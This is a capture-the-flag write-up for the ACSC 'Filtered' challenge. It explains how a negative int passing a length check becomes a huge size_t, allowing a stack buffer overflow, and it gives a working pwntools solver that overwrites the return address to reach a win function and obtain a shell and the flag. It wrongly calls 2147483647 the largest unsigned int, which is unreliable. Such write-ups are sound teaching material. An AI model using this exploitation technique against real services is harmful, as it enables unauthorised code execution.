---
description: Buffer overflow with a flawed length check
---

# Filtered

## Description

Filter invalid sizes to make it secure!\
\
Backup: `nc 167.99.78.201 9001`

`nc filtered.chal.acsc.asia 9001`

{% file src="../../.gitbook/assets/filtered.tar.gz_9a6cb1b3eafce70ff549ba6b942f34a9.gz" %}
Challenge Files
{% endfile %}

## Solution

First, the user is asked for the data length. If the length is more than 0x100, the program exits.

```c
int length;
char buf[0x100];

/* Read and check length */
length = readint("Size: ");
if (length > 0x100) {
  print("Buffer overflow detected!\n");
  exit(1);
}

/* Read data */
readline("Data: ", buf, length);
print("Bye!\n");
```

The length is read using `atoi()`:

```c
/* Print `msg` and read an integer value */
int readint(const char *msg) {
  char buf[0x10];
  readline(msg, buf, 0x10);
  return atoi(buf);
}
```

I came across [this thread](https://stackoverflow.com/questions/41869515/overflow-when-change-from-string-to-int-in-c/41869611). Using `2147483648`, an integer overflow is caused since the largest unsigned int is `2147483647`. Therefore, `length` will be a negative signed integer, passing the length check.

However, when calling `readline()`, the length is passed to a `size_t` argument.

```c
/* Print `msg` and read `size` bytes into `buf` */
void readline(const char *msg, char *buf, size_t size) {
  char c;
  print(msg);
  for (size_t i = 0; i < size; i++) {
    if (read(0, &c, 1) <= 0) {
      print("I/O Error\n");
      exit(1);
    } else if (c == '\n') {
      buf[i] = '\0';
      break;
    } else {
      buf[i] = c;
    }
  }
}
```

Now, `size_t` is _unsigned_, so the permitted size would instead become a large positive integer. We can try this experiment ourselves:

```c
int main() {
    int length = atoi("2147483648");
    printf("%d\n", length);

    size_t size = length;
    printf("%zu\n", length);
}
```

The output would be:

```
-2147483648
2147483648
```

From here, this is a regular buffer overflow challenge. The offset is 280, and we want to jump to the win function here:

```
0x004011d6    1 65           sym.win
```

Solver script:

```python
from pwn import *

conn = remote("167.99.78.201", 9001)

print(conn.recvuntil(b"Size:"))

conn.send(b"2147483648\r\n")

print(conn.recvuntil(b"Data:"))

conn.send(b"A" * 280 + p64(0x004011d6) + b"\r\n")

conn.interactive()
```

Get the flag:

```
└─# python3 filtered.py
[+] Opening connection to 167.99.78.201 on port 9001: Done
b'Size:'
b' Data:'
[*] Switching to interactive mode
 Bye!
$ whoami
pwn
$ ls -la
total 36
drwxr-xr-x 1 root pwn   4096 Sep 18 02:21 .
drwxr-xr-x 1 root root  4096 Sep 18 02:21 ..
-r-xr-x--- 1 root pwn     40 Sep 18 02:20 .redir.sh
-r-xr-x--- 1 root pwn  17008 Sep 18 02:20 filtered
-r--r----- 1 root pwn     59 Sep 18 02:20 flag-08d995360bfb36072f5b6aedcc801cd7.txt
$ cat flag-08d995360bfb36072f5b6aedcc801cd7.txt
ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}
$
```
